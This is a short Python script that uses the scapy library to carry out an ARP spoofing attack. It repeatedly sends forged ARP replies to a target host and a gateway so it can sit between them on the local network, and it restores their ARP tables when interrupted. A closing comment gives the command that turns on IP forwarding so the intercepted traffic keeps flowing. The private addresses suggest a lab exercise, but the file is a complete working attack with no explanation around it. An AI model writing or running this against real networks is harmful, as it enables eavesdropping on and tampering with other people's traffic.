import scapy.all as scapy
import time

def getMac(ip):
	arp_request = scapy.ARP(pdst=ip)
	# arp_request.show()
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	# broadcast.show()
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

	return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
	target_mac = getMac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
	# print(packet.show())
	# print(packet.summary())
	scapy.send(packet,verbose=False)

def restoreIP(des_ip,source_ip):
	des_mac = getMac(des_ip)
	source_mac = getMac(source_ip)
	packet = scapy.ARP(op=2, pdst=des_ip,hwdst=des_mac, psrc=source_ip,hwsrc=source_mac)
	scapy.send(packet, count = 4,verbose=False)

target_ip = "10.0.2.5"
gateway = "10.0.2.1"

try:
	sent_packets_count = 0
	while True:
		spoof("10.0.2.5","10.0.2.1")
		spoof("10.0.2.1","10.0.2.5")
		sent_packets_count += 2
		print("\r[+] Packet sent: " + str(sent_packets_count), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[-] Detected CTRL + C ... Resetting ARP tables.... Please wait.\n")
	restoreIP(target_ip,gateway)
	restoreIP(gateway,target_ip)



# getMac("10.0.2.1") 
# echo 1 > /proc/sys/net/ipv4/ip_forward 